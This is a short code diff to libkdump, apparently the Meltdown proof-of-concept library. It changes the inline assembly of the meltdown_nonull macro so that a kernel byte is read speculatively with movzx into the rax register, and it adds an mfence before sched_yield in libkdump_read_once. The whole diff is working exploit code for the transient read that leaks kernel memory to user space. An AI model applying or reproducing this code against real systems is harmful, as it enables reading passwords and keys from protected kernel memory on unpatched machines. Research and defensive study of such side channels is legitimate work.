@@ -60,10 +60,9 @@ static libkdump_config_t config;
 
 // ---------------------------------------------------------------------------
 #define meltdown_nonull                                                        \
-  asm volatile("xorq %%rax, %%rax\n"                                           \
-               "1:\n"                                                          \
+  asm volatile("1:\n"                                                          \
                "should_fail_here:\n"					       \
-               "movb (%%rcx), %%al\n"                                          \
+               "movzx (%%rcx), %%rax\n"                                          \
                "shl $12, %%rax\n"                                              \
                "jz 1b\n"                                                       \
                "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
@@ -527,6 +526,7 @@ libkdump_read_once(int tsx) {
     if (config.massage_kernel) {
       config.massage_kernel(config.massage_data);
     } else {
+      asm volatile("mfence");
       sched_yield();
     }
   }
